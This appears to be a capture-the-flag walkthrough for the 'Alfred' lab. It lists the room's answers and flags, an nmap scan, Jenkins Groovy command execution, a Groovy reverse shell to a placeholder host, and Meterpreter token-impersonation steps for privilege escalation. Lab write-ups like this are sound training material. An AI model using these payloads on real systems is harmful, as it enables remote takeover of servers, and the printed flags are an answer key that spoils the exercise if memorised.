# Alfred
##### Question 1: How many ports are open?
Answer
```bash
3
```

##### Question 2: WHat is the username and password for the login panel?
Answer
```bash
admin:admin
```

##### Question 3: What is the user flag?
Answer
```bash
79007a09481963edf2e1321abd9ae2a0
```

##### Question 4: What is the final size of the exe payload that you generated?
Answer
```bash
73802
```

##### Question 5: What is the output when you run the getuid command?
Answer
```bash
NT AUTHORITY\SYSTEM
```

##### Question 6: Contents of root flag
Answer
```bash
dff0f748678f280250f25a45b8046b4a
```

- - - - - - - - - - -- - - - - -  - - - -  - - -  - - - - - -  - - 
Nmap Scan:
```bash

Nmap scan report for 10.10.90.98
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-12-16T22:20:58
|_Not valid after:  2022-06-17T22:20:58
|_ssl-date: 2021-12-17T22:25:57+00:00; +1s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   43.72 ms  10.6.0.1
2   ... 3
4   110.31 ms 10.10.90.98

```

Jenkins Groovy Run Commands:
```bash
def cmd = 'whoami'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Jenkins Shell
```bash
String host="HOST";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

Priv Esc:
```bash
load incognito
impersonate_token "BUILTIN\Administrators"
migrate -N winlogon.exe
```